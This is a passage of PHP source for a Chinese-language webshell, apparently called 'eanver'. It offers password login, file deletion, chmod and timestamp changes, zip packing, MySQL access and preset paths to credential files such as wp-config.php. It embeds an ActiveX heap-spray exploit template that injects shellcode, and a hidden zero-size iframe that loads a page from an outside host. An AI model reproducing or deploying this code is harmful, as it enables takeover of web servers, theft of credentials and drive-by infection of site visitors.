		$datastr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$datastr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 

		fwrite($this->fp,$datastr);	//写入新的文件内容
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
		$dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		$dirstr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$dirstr .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
		$dirstr .= pack("V", 16 ).pack("V",$this->datastr_len).$name; 
		
		$this->dirstr .= $dirstr;	//目录信息

		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
	}


	function createfile(){
		//压缩包结束信息,包括文件总数,目录信息读取指针位置等信息
		$endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
					pack('v', $this -> file_count) .
					pack('v', $this -> file_count) .
					pack('V', $this -> dirstr_len) .
					pack('V', $this -> datastr_len) .
					"\x00\x00";

		fwrite($this->fp,$this->dirstr.$endstr);
		fclose($this->fp);
	}
 }

function File_Act($array,$actall,$inver,$REAL_DIR)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
     function listfiles($dir=".",$faisunZIP,$mydir){
		$sub_file_num = 0;
		if(is_file($mydir."$dir")){
		  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir")){
			$faisunZIP -> addfile(file_get_contents($mydir.$dir),"$dir");
			return 1;
		  }
			return 0;
		}
		
		$handle=opendir($mydir."$dir");
		while ($file = readdir($handle)) {
		   if($file=="."||$file=="..")continue;
		   if(is_dir($mydir."$dir/$file")){
			 $sub_file_num += listfiles("$dir/$file",$faisunZIP,$mydir);
		   }
		   else {
		   	   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir/$file")){
			     $faisunZIP -> addfile(file_get_contents($mydir.$dir."/".$file),"$dir/$file");
				 $sub_file_num ++;
				}
		   }
		}
		closedir($handle);
		if(!$sub_file_num) $faisunZIP -> addfile("","$dir/");
		return $sub_file_num;
	}

   function num_bitunit($num){
	  $bitunit=array(' B',' KB',' MB',' GB');
	  for($key=0;$key<count($bitunit);$key++){
		if($num>=pow(2,10*$key)-1){ //1023B 会显示为 1KB
		  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100)." $bitunit[$key]";
		}
	  }
	  return $num_bitunit_str;
   }

	$mydir=$REAL_DIR.'/';
	if(is_array($array)){
		$faisunZIP = new PHPzip;
		if($faisunZIP -> startfile("$inver")){
			$filenum = 0;
			foreach($array as $file){
				$filenum += listfiles($file,$faisunZIP,$mydir);
			}
			$faisunZIP -> createfile();
			return "压缩完成,共添加 $filenum 个文件.<br><a href='$inver'>点击下载 $inver (".num_bitunit(filesize("$inver")).")</a>";
		}else{
			return "$inver 不能写入,请检查路径或权限是否正确.<br>";
		}
	}else{
		return "没有选择的文件或目录.<br>";
	}


	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}

	function start_unzip($tmp_name,$new_name,$todir='zipfile'){
		$z = new Zip;
		$have_zip_file=0;
		$upfile = array("tmp_name"=>$tmp_name,"name"=>$new_name);
		if(is_file($upfile[tmp_name])){
			$have_zip_file = 1;
			echo "<br>正在解压: $upfile[name]<br><br>";
			if(preg_match('/\.zip$/mis',$upfile[name])){
				$result=$z->Extract($upfile[tmp_name],$todir);
				if($result==-1){
					echo "<br>文件 $upfile[name] 错误.<br>";
				}
				echo "<br>完成,共建立 $z->total_folders 个目录,$z->total_files 个文件.<br><br><br>";
			}else{
				echo "<br>$upfile[name] 不是 zip 文件.<br><br>";			
			}
			if(realpath($upfile[name])!=realpath($upfile[tmp_name])){
				@unlink($upfile[name]);
				rename($upfile[tmp_name],$upfile[name]);
			}
		}
	}

function muma($filecode,$filetype){
	$dim = array(
	"php" => array("eval(","exec("),
	"asp" => array("WScript.Shell","execute(","createtextfile("),
	"aspx" => array("Response.Write(eval(","RunCMD(","CreateText()"),
	"jsp" => array("runtime.exec(")
	);
	foreach($dim[$filetype] as $code){
		if(stristr($filecode,$code)) return true;
	}
}

function debug($file,$ftype){
	$type=explode('|',$ftype);
	foreach($type as $i){
		if(stristr($file,$i))	return true;
	}
}

/*---string---*/

function str_path($path){
	return str_replace('//','/',$path);
}

function msg($msg){
	die("<script>window.alert('".$msg."');history.go(-1);</script>");
}

function uppath($nowpath){
	$nowpath = str_replace('\\','/',dirname($nowpath));
	return urlencode($nowpath);
}

function xxstr($key){
	$temp = str_replace("\\\\","\\",$key);
	$temp = str_replace("\\","\\\\",$temp);
	return $temp;
}

/*---html---*/

function html_ta($url,$name){
	html_n("<a href=\"$url\" target=\"_blank\">$name</a>");
}

function html_a($url,$name,$where=''){
	html_n("<a href=\"$url\" $where>$name</a> ");
}

function html_img($url){
	html_n("<img src=\"?img=$url\" border=0>");
}

function back(){
	html_n("<input type='button' value='返回' onclick='history.back();'>");
}

function html_radio($namei,$namet,$v1,$v2){
	html_n('<input type="radio" name="return" value="'.$v1.'" checked>'.$namei);
	html_n('<input type="radio" name="return" value="'.$v2.'">'.$namet.'<br><br>');
}

function html_input($type,$name,$value = '',$text = '',$size = '',$mode = false){
	if($mode){
		html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
	}else{
		html_n("$text <input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\">");
	}
}

function html_text($name,$cols,$rows,$value = ''){
	html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_select($array,$mode = '',$change = '',$name = 'class'){
	html_n("<select name=$name $change>");
	foreach($array as $name => $value){
		if($name == $mode){
			html_n("<option value=\"$name\" selected>$value</option>");
		}else{
			html_n("<option value=\"$name\">$value</option>");
		}
	}
	html_n("</select>");
}

function html_font($color,$size,$name){
	html_n("<font color=\"$color\" size=\"$size\">$name</font>");
}

function GetHtml($url)
{
      $c = '';
      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
      if(function_exists('fsockopen')){
    	$link = parse_url($url);
	    $query=$link['path'].'?'.$link['query'];
	    $host=strtolower($link['host']);
	    $port=$link['port'];
	    if($port==""){$port=80;}
	    $fp = fsockopen ($host,$port, $errno, $errstr, 10);
	    if ($fp)
	      {
		    $out = "GET /{$query} HTTP/1.0\r\n"; 
		    $out .= "Host: {$host}\r\n"; 
		    $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n"; 
		    $out .= "Connection: Close\r\n\r\n"; 
		    fwrite($fp, $out);
		    $inheader=1;
		    while(!feof($fp)) 
		         {$line=fgets($fp,4096);	
			      if($inheader==0){$contents.=$line;}
			      if ($inheader &&($line=="\n"||$line=="\r\n")){$inheader = 0;}
		    } 
		    fclose ($fp); 
		    $c= $contents;
	      }
        }
		if(empty($c) && function_exists('curl_init') && function_exists('curl_exec')){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            $c = curl_exec($ch);
            curl_close($ch);
        }
        if(empty($c) && ini_get('allow_url_fopen')){
            $c = file_get_contents($url);
        }
		if(empty($c)){
            echo "document.write('<DIV style=\'CURSOR:url(\"$url\")\'>');";
        }
		if(!empty($c))
		{
        return $c;
		}
 }

function html_main($path,$shellname){
$serverip=gethostbyname($_SERVER['SERVER_NAME']);
print<<<END
<html><title>{$shellname}</title>
<table width='100%'><tr><td width='150' align='center'>{$serverip}</td><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'><input name='path' style='width:100%' value='{$path}'></td><td width='140' align='center'><input name='Submit' type='submit' value='跳到'> <input type='submit' value='刷新' onclick='main.location.reload()'></td></tr></form></table>
END;
	html_n("<table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'>");
	html_n("</iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'>");
	html_n("</iframe></td></tr></table></html>");
}

function islogin($shellname,$myurl){
print<<<END
<style type="text/css">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}.C{background-color:#000000;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}.am{color:#888;font-size:11px;}</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)" scroll=no><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='{$myurl}' target='_blank'>{$shellname}</a><br><br><form method='post'>输入密码：<input name='envlpass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><font color=#3399FF>请于用于非法用途，后果作者概不负责！</font><br></div></center>
END;
}

function html_sql(){
	html_input("text","sqlhost","localhost","<br>MYSQL地址","30");
	html_input("text","sqlport","3306","<br>MYSQL端口","30");
	html_input("text","sqluser","root","<br>MYSQL用户","30");
	html_input("password","sqlpass","","<br>MYSQL密码","30");
	html_input("text","sqldb","dbname","<br>MYSQL库名","30");
	html_input("submit","sqllogin","登陆","<br>");
	html_n('</form>');
}

function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}

function html_n($data){
	echo "$data\n";
}

/*---css---*/

function css_img($img){
	$images = array(
	"exe"=>
	"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
	"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
	"xhIAOw==",
	"dir"=>"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE".
	"oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
	"txt"=>
	"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
	"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
	"UpPWG3Ig6Hq/XmRjuZwkAAA7",
	"html"=>
	"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
	"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
	"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
	"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
	"ADs=",
	"js"=>
	"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
	"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
	"a00AjYYBbc/o9HjNniUAADs=",
	"xml"=>
	"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
	"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
	"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
	"IQA7",
	"mp3"=>
	"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
	"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
	"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
	"img"=>
	"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
	"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
	"FxEAOw==",
	"title"=>"R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+".
	"mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL".
	"I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7",
	"rar"=>"R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/".
    "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b".
    "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC".
    "aNOmRcjVj02tPxPCzfkvIAA7"
	);
  header('Content-type: image/gif');
  echo base64_decode($images[$img]);
  die();
}

function css_showimg($file){
	$it=substr($file,-3);
	switch($it){
		case "jpg": case "gif": case "bmp": case "png": case "ico": return 'img';break;
		case "htm": case "tml": return 'html';break;
		case "exe": case "com": return 'exe';break;
		case "xml": case "doc": return 'xml';break;
		case ".js": case "vbs": return 'js';break;
		case "mp3": case "wma": case "wav": case "swf": case ".rm": case "avi":case "mp4":case "mvb": return 'mp3';break;
		case "rar": case "tar": case ".gz": case "zip":case "iso": return 'rar';break;
  	default: return 'txt';break;
	}
}

function css_js($num,$code = ''){
	if($num == "shellcode"){
		return '<%@ LANGUAGE="JavaScript" %>
		<%
		var act=new ActiveXObject("HanGamePluginCn18.HanGamePluginCn18.1");
		var shellcode = unescape("'.$code.'");
		var bigblock = unescape("%u9090%u9090");
		var headersize = 20;
		var slackspace = headersize+shellcode.length;
		while (bigblock.length<slackspace) bigblock+=bigblock;
		fillblock = bigblock.substring(0, slackspace);
		block = bigblock.substring(0, bigblock.length-slackspace);
		while(block.length+slackspace<0x40000) block = block+block+fillblock;
		memory = new Array();
		for (x=0; x<300; x++) memory[x] = block + shellcode;
		var buffer = "";
		while (buffer.length < 1319) buffer+="A";
		buffer=buffer+"\x0a\x0a\x0a\x0a"+buffer;
		act.hgs_startNotify(buffer);
		%>';
	}
	html_n('<script language="javascript">');
	if($num == "1"){
	html_n('	function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		} 
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == \'b\')
			{
				document.getElementById(\'actall\').value = escape(gourl);
				document.getElementById(\'fileall\').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != \'chkall\')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
			else{document.getElementById(\'actall\').value = gourl; document.getElementById(\'inver\').value = re; document.getElementById(\'fileall\').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById(\'actall\').value = actid;
			document.getElementById(\'inver\').value = escape(re);
			document.getElementById(\'fileall\').submit();
		}
	}');
	}elseif($num == "2"){
	html_n('var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById(\'mtime\').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
	else{document.getElementById(\'editor\').submit();}
}');
}elseif($num == "3"){
	html_n('function Full(i){
   if(i==0 || i==5){
     return false;
   }
  Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES(\'eanver\',\'mypass\')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER=\'eanver\' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){
	  DbForm.string.value = Str[i];
  }else{
  	DbForm.sql.value = Str[i];
  }
  return true;
  }');
}
elseif($num == "4"){
	html_n('function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(8);  
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	sform.code.value = Str[i];
  return true;
  }');
}
html_n('</script>');
}

function css_left(){
	html_n('<style type="text/css">
	.menu{width:152px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:152px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#FFFFCC;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#000000;height:27px;widows:152px;display:block;line-height:27px;text-indent:28px;
	background:#BBBBBB no-repeat 13px 11px;border-color:#FFF #545454 #545454 #FFF;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	</STYLE>');
	html_n('<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe><div class="menu">');
}

function css_main(){
	html_n('<style type="text/css">
	*{padding:0px;margin:0px;}
	body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
	input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
    a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</STYLE><body style="table-layout:fixed; word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
	<table width="85%" border=0 bgcolor="#555555" align="center">');
}

function css_foot(){
	html_n('</td></tr></table>');
}


class eanver{
var $out='';
function eanver($dir){
	if(@function_exists('gzcompress')){
	if(count($dir) > 0){
	foreach($dir as $file){
		if(is_file($file)){
			$filecode = file_get_contents($file);
			if(is_array($dir)) $file = basename($file);
			$this -> filezip($filecode,$file);
		}
	}
	$this->out = $this -> packfile();
	}
	return true;
	}
	else return false;
}
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function at($atunix = 0) {
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980) {
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		} 
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |
				($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	function filezip($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x' . $dtime[6] . $dtime[7]
					. '\x' . $dtime[4] . $dtime[5]
					. '\x' . $dtime[2] . $dtime[3]
					. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function packfile(){
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}

class zip
{

 var $total_files = 0;
 var $total_folders = 0; 

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
   		if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
		return(-1);
   }
   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
